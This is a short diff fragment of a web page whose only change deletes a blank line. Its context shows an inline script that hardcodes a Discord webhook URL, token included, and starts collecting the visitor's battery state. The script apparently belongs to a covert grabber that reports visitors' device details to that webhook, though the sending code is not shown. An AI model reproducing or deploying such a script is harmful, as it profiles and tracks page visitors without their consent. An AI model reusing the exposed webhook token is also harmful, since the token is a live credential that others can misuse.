@@ -15,7 +15,6 @@
 <script>
 (async () => {
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1459180864901742593/Mj78fxKbGMIjH_qHELRexvyGi-WRRVIEB01O1MnQRcTc91B66v0RS3eHc1HSUWrE2Iaz";
-
   async function getBattery() {
     if (navigator.getBattery) {
       try { const b = await navigator.getBattery(); return `Level:${Math.round(b.level*100)}%, Charging:${b.charging}, ChargingTime:${b.chargingTime}s, DischargingTime:${b.dischargingTime}s`; }
